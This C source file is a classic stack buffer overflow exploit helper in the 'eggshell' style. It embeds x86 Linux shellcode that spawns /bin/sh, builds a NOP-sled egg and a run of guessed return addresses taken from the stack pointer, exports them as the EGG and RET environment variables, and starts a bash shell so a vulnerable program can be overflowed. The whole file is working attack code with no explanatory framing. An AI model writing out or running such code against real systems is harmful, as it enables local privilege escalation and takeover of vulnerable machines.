#include <stdlib.h>



#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] = 
   "\xeb\x1f"             // jmp 0x1f              # 2 bytes 
   "\x5e"                 // popl %esi             # 1 byte 
   "\x89\x76\x08"         // movl %esi,0x8(%esi)   # 3 bytes
   "\x31\xc0"             // xorl %eax,%eax        # 2 bytes 
   "\x88\x46\x07"         // movb %eax,0x7(%esi)   # 3 bytes 
   "\x89\x46\x0c"         // movl %eax,0xc(%esi)   # 3 bytes 
   "\xb0\x0b"             // movb $0xb,%al         # 2 bytes 
   "\x89\xf3"             // movl %esi,%ebx        # 2 bytes 
   "\x8d\x4e\x08"         // leal 0x8(%esi),%ecx   # 3 bytes
   "\x8d\x56\x0c"         // leal 0xc(%esi),%edx   # 3 bytes
   "\xcd\x80"             // int $0x80             # 2 bytes
   "\x31\xdb"             // xorl %ebx,%ebx        # 2 bytes 
   "\x89\xd8"             // movl %ebx,%eax        # 2 bytes 
   "\x40"                 // inc %eax              # 1 bytes 
   "\xcd\x80"             // int $0x80             # 2 bytes
   "\xe8\xdc\xff\xff\xff" // call -0x24            # 5 bytes
   "/bin/sh";             // .string \"/bin/sh\"   # 8 bytes


unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}



void main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;



  if (argc > 1) bsize   = atoi(argv[1]);
  if (argc > 2) offset  = atoi(argv[2]);
  if (argc > 3) eggsize = atoi(argv[3]);



  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }



  addr = get_esp() - offset;
  printf("Using address: 0x%x\n", addr);



  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;



  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;



  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];



  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';



  memcpy(egg,"EGG=",4);
  putenv(egg);
  memcpy(buff,"RET=",4);
  putenv(buff);
  system("/bin/bash");
}